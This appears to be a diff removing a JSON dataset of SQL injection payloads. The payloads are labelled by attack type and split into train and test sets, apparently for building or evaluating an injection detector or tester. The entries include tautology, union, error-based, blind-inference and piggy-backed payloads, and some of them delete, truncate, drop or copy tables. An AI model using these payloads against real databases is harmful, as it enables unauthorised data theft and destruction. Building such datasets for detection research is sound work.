@@ -1,1951 +1,1951 @@
 [
-  {
-    "type": "Error base attack",
-    "payload": "' AND CAST('abc' AS UNSIGNED) = 1--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "train"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND CAST('test' AS DECIMAL)--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND CAST((SELECT CONCAT('string', 'apple') AS UNSIGNED)--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND 'a example' > 1--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND 'simple example' + 0--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND 1=1 THEN CAST('abc' AS UNSIGNED) ELSE 0 END)--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND 1/(SELECT 0)--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "train"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND MOD(1,(SELECT 0))--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND SQRT(-1)--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "train"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND LOG2(-1)--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND (SELECT 9223372036854775807 + 1)--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "train"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND (SELECT -9223372036854775808 - 1)--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND (SELECT 1.7976931348623157e+308 * 2)--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND SUBSTR('test', 1, -1)--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND SUBSTR('test', 'fly', 1)--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND TIME('animal') = '15:00:02'--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND DATE('talk') = '2002-10-1'--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND TO_DAYS(21324) = 281911--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND extractvalue(1,concat(0x1fde75d7,'daiodww',0x1fde75d7))--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "train"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND updatexml(1,concat(0x34332c7b,778,0x1d4d5cd7),1)--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND GTID_SUBSET('learning',1) = 1--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND GTID_SUBTRACT('deep',101) = 1--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Union-query attack",
-    "payload": "' UNION SELECT NULL--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "train"
-  },
-  {
-    "type": "Union-query attack",
-    "payload": "' ORDER BY 1--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "train"
-  },
-  {
-    "payload": "' ORDER BY 2--",
-    "type": "Union-query attack",
-    "information_features": "constant",
-    "set": "train",
-    "expected_types": null
-  },
-  {
-    "payload": "' ORDER BY 3--",
-    "type": "Union-query attack",
-    "information_features": "constant",
-    "set": "train",
-    "expected_types": null
-  },
-  {
-    "payload": "' GROUP BY 1--",
-    "type": "Union-query attack",
-    "information_features": "constant",
-    "set": "train",
-    "expected_types": null
-  },
-  {
-    "payload": "' GROUP BY 2--",
-    "type": "Union-query attack",
-    "information_features": "constant",
-    "set": "train",
-    "expected_types": null
-  },
-  {
-    "payload": "' GROUP BY 3--",
-    "type": "Union-query attack",
-    "information_features": "constant",
-    "set": "train",
-    "expected_types": null
-  },
-  {
-    "payload": "' GROUP BY 1 HAVING 1 = 1--",
-    "type": "Union-query attack",
-    "information_features": "constant",
-    "set": "train",
-    "expected_types": null
-  },
-  {
-    "payload": "' GROUP BY 1,2 HAVING 1 = 1--",
-    "type": "Union-query attack",
-    "information_features": "constant",
-    "set": "train",
-    "expected_types": null
-  },
-  {
-    "payload": "' UNION SELECT 1--",
-    "type": "Union-query attack",
-    "information_features": "constant",
-    "set": "train",
-    "expected_types": null
-  },
-  {
-    "type": "Union-query attack",
-    "payload": "' ORDER BY 2--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Union-query attack",
-    "payload": "' ORDER BY 3--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Union-query attack",
-    "payload": "' GROUP BY 1--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Union-query attack",
-    "payload": "' GROUP BY 2--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Union-query attack",
-    "payload": "' GROUP BY 3--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Union-query attack",
-    "payload": "' GROUP BY 1 HAVING 1 = 1--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Union-query attack",
-    "payload": "' GROUP BY 1,2 HAVING 1 = 1--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Union-query attack",
-    "payload": "' UNION SELECT 'name'--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "train"
-  },
-  {
-    "type": "Union-query attack",
-    "payload": "' UNION SELECT 8392--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR 1 = 1--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "train"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR 'a' = 'a'--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR 2 > 1--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR 1 * 1 = 1--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR 2/2 = 1--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR 'a' LIKE '%'--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "train"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR 'a' REGEXP '[a-z]'--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR TRIM(' ') = ''--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR LTRIM(' a') = 'a'--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR RTRIM('a ') = 'a'--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR REPLACE('abc','b','x') = 'axc'--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR INSTR('hello','e') = 2--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR SUBSTRING('test',1,1) = 't'--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "train"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR LENGTH('') = 0--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "train"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR LOWER('A') = 'a'--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR UPPER('a') = 'A'--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR QUOTE('test') = '\\'test\\''--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR ABS(-5) = 5--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "train"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR LEAST(1,2) = 1--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR GREATEST(1,2) = 2--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR ROUND(3.7) = 4--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR CEIL(3.2) = 4--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR FLOOR(3.8) = 3--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR 1 REGEXP '^[0-9]+$' = 1--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR 1.0 REGEXP '^[0-9]+\\.[0-9]+$' = 1--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR 'a' REGEXP '^[a-zA-Z]+$' = 1--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "train"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR IF(1=1,'true','false') = 'true'--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "train"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR NULLIF(1,2) = 1--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR COALESCE(NULL,1) = 1--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR IFNULL(NULL,1) = 1--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR ISNULL(NULL) = 1--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR DATE('2023-01-01') = '2023-01-01'--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR TO_DAYS('2023-01-01') > 700000--",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR ROUND(TO_DAYS(NOW())) > 0--",
-    "expected_types": null,
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR TIME(NOW()) IS NOT NULL",
-    "expected_types": null,
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Time base inference attack",
-    "payload": "' AND SLEEP(5) --",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Time base inference attack",
-    "payload": "' OR SLEEP(5) --",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "train"
-  },
-  {
-    "type": "Time base inference attack",
-    "payload": "' AND IF(191 = 191,SLEEP(5),0) --",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "train"
-  },
-  {
-    "type": "Time base inference attack",
-    "payload": "' AND (SELECT SLEEP(5) WHERE 1.9 > 1.54) --",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Time base inference attack",
-    "payload": "' AND CASE WHEN 'sla' = 'sla' THEN SLEEP(5) ELSE 0 END --",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Time base inference attack",
-    "payload": "' AND EXISTS(SELECT SLEEP(5)) --",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "test"
-  },
-  {
-    "type": "Time base inference attack",
-    "payload": "' AND BENCHMARK(500000,MD5('example')) --",
-    "expected_types": null,
-    "information_features": "constant",
-    "set": "train"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND CAST(($sysInfo$) AS UNSIGNED)=$int$--",
-    "expected_types": [
-      "string",
-      "integer"
-    ],
-    "information_features": "system information",
-    "set": "train"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND CAST(($sysInfo$) AS DECIMAL)=$float$--",
-    "expected_types": [
-      "string",
-      "float"
-    ],
-    "information_features": "system information",
-    "set": "train"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND CAST(($sysInfo$) AS BINARY)=$hex$--",
-    "expected_types": [
-      "string",
-      "hex"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND ($sysInfo$)=$int$--",
-    "expected_types": [
-      "string",
-      "integer"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND ($sysInfo$)>$int$--",
-    "expected_types": [
-      "string",
-      "integer"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND ($sysInfo$) BETWEEN $int$ AND $int$--",
-    "expected_types": [
-      "string",
-      "integer",
-      "integer"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND SQRT($sysInfo$)--",
-    "expected_types": [
-      "string"
-    ],
-    "information_features": "system information",
-    "set": "train"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND MOD($int$, $sysInfo$)--",
-    "expected_types": [
-      "integer",
-      "string"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND SUBSTR($sysInfo$, $int$, $int$)=$character$--",
-    "expected_types": [
-      "integer",
-      "integer",
-      "integer",
-      "character"
-    ],
-    "information_features": "system information",
-    "set": "train"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND SUBSTR($int$, $int$, $sysInfo$)=$character$--",
-    "expected_types": [
-      "integer",
-      "integer",
-      "integer",
-      "character"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND TIME($sysInfo$)=$time$--",
-    "expected_types": [
-      "string",
-      "time"
-    ],
-    "information_features": "system information",
-    "set": "train"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND DATE($sysInfo$)=$date$--",
-    "expected_types": [
-      "string",
-      "date"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND TO_DAYS($sysInfo$)=$int$--",
-    "expected_types": [
-      "integer",
-      "integer"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND extractvalue(1,concat($hex$,($sysInfo$),$hex$))--",
-    "expected_types": [
-      "hex",
-      "integer",
-      "hex"
-    ],
-    "information_features": "system information",
-    "set": "train"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND updatexml(1,concat($hex$,($sysInfo$),$hex$),1)--",
-    "expected_types": [
-      "hex",
-      "integer",
-      "hex"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND GTID_SUBSET(($sysInfo$),$character$)=1--",
-    "expected_types": [
-      "integer",
-      "character"
-    ],
-    "information_features": "system information",
-    "set": "train"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND GTID_SUBTRACT(($sysInfo$),$character$)=1--",
-    "expected_types": [
-      "integer",
-      "character"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Union-query attack",
-    "payload": "' UNION $sysInfo$--",
-    "expected_types": [
-      "all"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Union-query attack",
-    "payload": "' UNION ALL $sysInfo$--",
-    "expected_types": [
-      "all"
-    ],
-    "information_features": "system information",
-    "set": "train"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR ($sysInfo$)=$sample$--",
-    "expected_types": [
-      "all",
-      "all"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR ($sysInfo$)>0--",
-    "expected_types": [
-      "integer"
-    ],
-    "information_features": "system information",
-    "set": "train"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR LENGTH($sysInfo$)>0--",
-    "expected_types": [
-      "string"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR ($sysInfo$) IS NOT NULL--",
-    "expected_types": [
-      "all"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR EXISTS($sysInfo$)--",
-    "expected_types": [
-      "all"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR ($sysInfo$) LIKE $sample$--",
-    "expected_types": [
-      "string",
-      "string"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR ($sysInfo$) REGEXP '[a-z]'--",
-    "expected_types": [
-      "string"
-    ],
-    "information_features": "system information",
-    "set": "train"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR NOT ISNULL($sysInfo$)--",
-    "expected_types": [
-      "all"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR COALESCE($sysInfo$)--",
-    "expected_types": [
-      "all"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR ($sysInfo$)=($sysInfo$)--",
-    "expected_types": [
-      "all",
-      "all"
-    ],
-    "information_features": "system information",
-    "set": "train"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR CASE WHEN ($sysInfo$)=$sample$ THEN 1 ELSE 0 END=1--",
-    "expected_types": [
-      "all",
-      "all"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR SUBSTRING($sysInfo$,1,1)=$character$--",
-    "expected_types": [
-      "string",
-      "character"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Tautologies attack",
-    "payload": "' OR LEFT($sysInfo$,1)=$character$--",
-    "expected_types": [
-      "string",
-      "character"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Piggy-backed queries attacks",
-    "payload": "'; SELECT $column_t1_1$ FROM $table_1$;--",
-    "expected_types": [
-      "all",
-      "table"
-    ],
-    "information_features": "system information",
-    "set": "train"
-  },
-  {
-    "type": "Piggy-backed queries attacks",
-    "payload": "'; DELETE FROM $table_1$ WHERE $column_t1_1$=$sample_t1_1$;--",
-    "expected_types": [
-      "table",
-      "all",
-      "all"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Piggy-backed queries attacks",
-    "payload": "'; DELETE FROM $table_1$ WHERE $sysInfo$ IS NOT NULL;--",
-    "expected_types": [
-      "table",
-      "all"
-    ],
-    "information_features": "system information",
-    "set": "train"
-  },
-  {
-    "type": "Piggy-backed queries attacks",
-    "payload": "'; TRUNCATE TABLE $table_1$;--",
-    "expected_types": [
-      "table"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Piggy-backed queries attacks",
-    "payload": "'; DROP TABLE IF EXISTS $table_1$;--",
-    "expected_types": [
-      "table"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Piggy-backed queries attacks",
-    "payload": "'; SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$=$sample_t1_2$;--",
-    "expected_types": [
-      "all",
-      "table",
-      "all",
-      "all"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Piggy-backed queries attacks",
-    "payload": "'; INSERT INTO temp_table SELECT * FROM $table_1$;--",
-    "expected_types": [
-      "table"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Piggy-backed queries attacks",
-    "payload": "'; INSERT INTO temp_table SELECT $column_t1_1$ FROM $table_1$ where $column_t1_2$=$sample_t1_2$;--",
-    "expected_types": [
-      "all",
-      "table",
-      "all",
-      "all"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Piggy-backed queries attacks",
-    "payload": "'; CREATE TABLE temp_data AS SELECT * FROM $table_1$;--",
-    "expected_types": [
-      "table"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Piggy-backed queries attacks",
-    "payload": "'; CREATE TABLE temp_data AS SELECT $column_t1_1$ FROM $table_1$ where $column_t1_2$=$sample_t1_2$;--",
-    "expected_types": [
-      "all",
-      "table",
-      "all",
-      "all"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Piggy-backed queries attacks",
-    "payload": "'; UPDATE $table_1$ SET $column_t1_1$=$int$ WHERE $column_t1_2$=$sample_t1_2$;--",
-    "expected_types": [
-      "table",
-      "number",
-      "integer",
-      "all",
-      "all"
-    ],
-    "information_features": "system information",
-    "set": "train"
-  },
-  {
-    "type": "Boolean base inference attack",
-    "payload": "' AND ($sysInfo$)=$sample$--",
-    "expected_types": [
-      "all",
-      "all"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Boolean base inference attack",
-    "payload": "' AND ($sysInfo$)>$int$--",
-    "expected_types": [
-      "integer",
-      "integer"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Boolean base inference attack",
-    "payload": "' AND LENGTH($sysInfo$)>$int$--",
-    "expected_types": [
-      "string",
-      "integer"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Boolean base inference attack",
-    "payload": "' AND ($sysInfo$) LIKE $character$--",
-    "expected_types": [
-      "string",
-      "character"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Boolean base inference attack",
-    "payload": "' AND ($sysInfo$) REGEXP '[0-9]'--",
-    "expected_types": [
-      "string"
-    ],
-    "information_features": "system information",
-    "set": "train"
-  },
-  {
-    "type": "Boolean base inference attack",
-    "payload": "' AND RIGHT($sysInfo$,1)=$character$--",
-    "expected_types": [
-      "string",
-      "character"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Boolean base inference attack",
-    "payload": "' AND SUBSTR($sysInfo$, 1, 1) > $character$--",
-    "expected_types": [
-      "string",
-      "character"
-    ],
-    "information_features": "system information",
-    "set": "train"
-  },
-  {
-    "type": "Boolean base inference attack",
-    "payload": "' AND SUBSTR($sysInfo$, 1 ,1) IN ('a','e','i','o','u')--",
-    "expected_types": [
-      "string"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Boolean base inference attack",
-    "payload": "' AND ASCII(SUBSTR($sysInfo$, 1, 1))=$int$--",
-    "expected_types": [
-      "string",
-      "integer"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Boolean base inference attack",
-    "payload": "' AND CASE WHEN ($sysInfo$)=$sample$ THEN 1 ELSE 0 END=1--",
-    "expected_types": [
-      "all",
-      "all"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Boolean base inference attack",
-    "payload": "' AND IF(($sysInfo$)>$int$,1,0)=1--",
-    "expected_types": [
-      "integer",
-      "integer"
-    ],
-    "information_features": "system information",
-    "set": "train"
-  },
-  {
-    "type": "Time base inference attack",
-    "payload": "' AND SELECT SLEEP($int$) WHERE ($sysInfo$)=$sample$--",
-    "expected_types": [
-      "integer",
-      "all",
-      "all"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Time base inference attack",
-    "payload": "' AND SELECT SLEEP($int$) WHERE ($sysInfo$)>0--",
-    "expected_types": [
-      "integer",
-      "integer"
-    ],
-    "information_features": "system information",
-    "set": "train"
-  },
-  {
-    "type": "Time base inference attack",
-    "payload": "' AND SELECT SLEEP($int$) WHERE ($sysInfo$) LIKE $character$--",
-    "expected_types": [
-      "integer",
-      "string",
-      "character"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Time base inference attack",
-    "payload": "' AND IF((SELECT SUBSTRING($sysInfo$,$int$,1))=$character$,SLEEP($int$),0)--",
-    "expected_types": [
-      "string",
-      "integer",
-      "character",
-      "integer"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Time base inference attack",
-    "payload": "' AND CASE WHEN ($sysInfo$)=$sample$ THEN SLEEP(5) ELSE 0 END--",
-    "expected_types": [
-      "all",
-      "all"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Time base inference attack",
-    "payload": "' AND CASE WHEN ($sysInfo$) REGEXP '[a-z]' THEN SLEEP(5) ELSE 0 END--",
-    "expected_types": [
-      "string"
-    ],
-    "information_features": "system information",
-    "set": "train"
-  },
-  {
-    "type": "Time base inference attack",
-    "payload": "' AND SELECT BENCHMARK(1000000,MD5(1)) WHERE SUBSTR($sysInfo$,1,1) IN ('a','e','i','o','u')--",
-    "expected_types": [
-      "string"
-    ],
-    "information_features": "system information",
-    "set": "train"
-  },
-  {
-    "type": "Time base inference attack",
-    "payload": "' AND (SELECT COUNT(*) FROM $table_1$,$table_2$,$table_3$)>$int$--",
-    "expected_types": [
-      "table",
-      "table",
-      "table",
-      "integer"
-    ],
-    "information_features": "system information",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND CAST((SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) AS DECIMAL) = $float$--",
-    "expected_types": [
-      "string",
-      "table",
-      "all",
-      "all",
-      "float"
-    ],
-    "information_features": "specific database",
-    "set": "train"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) = $int$--",
-    "expected_types": [
-      "string",
-      "table",
-      "all",
-      "all",
-      "integer"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)>$int$--",
-    "expected_types": [
-      "string",
-      "table",
-      "all",
-      "all",
-      "integer"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND (SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$)>$int$--",
-    "expected_types": [
-      "string",
-      "table",
-      "table",
-      "number",
-      "number",
-      "all",
-      "all",
-      "integer"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND SQRT(SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$)--",
-    "expected_types": [
-      "string",
-      "table",
-      "table",
-      "number",
-      "number",
-      "all",
-      "all"
-    ],
-    "information_features": "specific database",
-    "set": "train"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND TIME(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) = $time$--",
-    "expected_types": [
-      "number",
-      "table",
-      "all",
-      "all",
-      "time"
-    ],
-    "information_features": "specific database",
-    "set": "train"
-  },
-  {
-    "type": "Error base attack",
-    "payload": "' AND TO_DAYS(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)=$int$--",
-    "expected_types": [
-      "number",
-      "table",
-      "all",
-      "all",
-      "integer"
-    ],
-    "information_features": "specific database",
-    "set": "test"
-  },
-  {
-    "type": "Error base attack",
